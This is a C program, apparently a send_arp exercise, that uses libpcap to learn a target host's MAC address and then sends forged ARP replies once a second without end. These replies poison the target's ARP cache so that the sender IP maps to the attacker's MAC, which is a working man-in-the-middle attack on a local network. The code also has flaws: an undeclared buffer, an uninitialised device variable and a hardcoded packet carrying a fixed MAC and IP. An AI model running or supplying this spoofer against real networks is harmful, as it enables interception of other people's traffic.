#include <pcap.h>
#include <stdio.h>
#include "libnet.h"
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include "get.c"



int main(int argc, char *argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "arp";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	struct libnet_ethernet_hdr* ethr;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
	struct libnet_ipv4_hdr* ip;
	uint8_t ip_addr[15];
	struct libnet_tcp_hdr* tcp;
	struct ether_arp* arp;
	const uint8_t* sender_ip;
	const uint8_t* target_ip;

	struct ether_arp* a_arp;	/* The header that pcap gives us */
	struct libnet_ethernet_hdr* a_ethr;

	u_char arpr_buf[60]="\xff\xff\xff\xff\xff\xff\x8c\x85\x90\x0c\xe5\x60\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01\x8c\x85\x90\x0c\xe5\x60\x0a\x01\x01\x75\x00\x00\x00\x00\x00\x00\x0a\x01\x01\x01";
	u_char arp_buf[60]={0,};

	int count=0;
	uint8_t mymac[6];
	/* Define the device */

	if(argc!=4) {printf("Usage : send_arp <interface> <sender ip> <target ip>\n");exit(0);}


	if((strlen(argv[2])>15||strlen(argv[2])<7)||(strlen(argv[3])>15||strlen(argv[3])<7)){ printf("Select the correct ip!!\n"); exit(0);}


	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	/* Grab a packet */
	int res;
	
	sender_ip=argv[2];

	target_ip=argv[3];

	a_ethr=(struct libnet_ethernet_hdr*)(arpr_buf);

	a_arp=((struct ether_arp*)&arpr_buf[sizeof(struct libnet_ethernet_hdr)]);

	strncpy(myd,argv[1],strlen(argv[1]));

  	myd[strlen(argv[1])]='\0';

  	getip(ip_addr,myd);

  	getmac(mymac);

	memcpy(a_ethr->ether_shost,mymac,6);

	memcpy(a_arp->arp_sha,mymac,6);
	
	inet_pton(AF_INET,target_ip,(a_arp->arp_tpa));
	
	inet_pton(AF_INET,ip_addr,(a_arp->arp_spa));

	while(1)
	{
		int chk=1;
		res = pcap_next_ex(handle, &header, &packet);


		for(int i=0;i<1;i++)
		{

			if((pcap_sendpacket(handle, arpr_buf,42))==0)
			{
		
				printf("Request!\n");
	
				for(int j=0;j<42;j++)
				{
					printf("%02x ",(arpr_buf[j]));
					if((j+1)%16==0&&j!=0)
						printf("\n");
				}
			
				printf("\n\n");
		
			}
		}

		if(res<1)
		{

			if(res==-2)
	       	{

				printf("No more packets to read from the savefile.\nSelect the correct files!\n"); break; 
			
			}	

			else if(res==0){printf("Timeout Expired! Retrying to capture packet.....\n");continue;}

			else {printf("Error Occured! Retrying to capture packet.....\n");continue;}
		}

	

		ethr=(struct libnet_ethernet_hdr*)packet;

  
  		arp=((struct ether_arp*)&packet[sizeof(struct libnet_ethernet_hdr)]);

	
		printf("===========================================================================\n");
	
	
		printf("eth.dmac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_dhost[0],ethr->ether_dhost[1],ethr->ether_dhost[2],ethr->ether_dhost[3],ethr->ether_dhost[4],ethr->ether_dhost[5]);
	

		printf("eth.smac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_shost[0],ethr->ether_shost[1],ethr->ether_shost[2],ethr->ether_shost[3],ethr->ether_shost[4],ethr->ether_shost[5]);
	

		printf("ether_type : %x \n",ethr->ether_type);


		printf("===========================================================================\n");


		if(ntohs(ethr->ether_type)!=ETHERTYPE_ARP){printf("It doesn't seem ARP Packet\n");continue;}
	
	
		inet_ntop(AF_INET,(arp->arp_spa),ip_addr,INET_ADDRSTRLEN);


		printf("ip.src : %s\n",ip_addr);


		inet_ntop(AF_INET,(arp->arp_tpa),ip_addr,INET_ADDRSTRLEN);


		printf("ip.dst : %s\n",ip_addr);


		printf("===========================================================================\n");
	

		inet_ntop(AF_INET,(arp->arp_spa),ip_addr,INET_ADDRSTRLEN);


//		printf("%x %x %x\n",htons(arp->arp_op),ntohs(arp->arp_op),(arp->arp_op));


		if(htons(arp->arp_op)==ARPOP_REPLY) 
		{

			printf("It is arp reply packet\n\n");
			
//			printf("!!!!!%d!!!!!\n",strcmp(ip_addr,target_ip));

			if(strcmp(ip_addr,target_ip)==0)break;
		}

		else {printf("It dosen't seem reply packet%x\n\n",arp->arp_op); continue;}

	}
	
	memcpy(ethr->ether_dhost,arp->arp_sha,6);


	memcpy(ethr->ether_shost,mymac,6);
	
	
	inet_pton(AF_INET,target_ip,&(arp->arp_tpa));
	

	inet_pton(AF_INET,sender_ip,&(arp->arp_spa));


	arp->arp_op=htons(ARPOP_REPLY);
	

	memcpy(arp->arp_tha,ethr->ether_dhost,6);


	memcpy(arp->arp_sha,mymac,6);


	memcpy(arp_buf, packet, 42);

	
	while(1)
	{

	if((pcap_sendpacket(handle, arp_buf,42))==0)
		{
		
		printf("Send!\n");
	
		for(int j=0;j<42;j++)
			{

			printf("%02x ",(arp_buf[j]));

			if((j+1)%16==0&&j!=0)

			printf("\n");

			}

			printf("\n");

		sleep(1);
		
		}
	else
		exit(0);
	}

	pcap_close(handle);

	
	return 0;
	
}
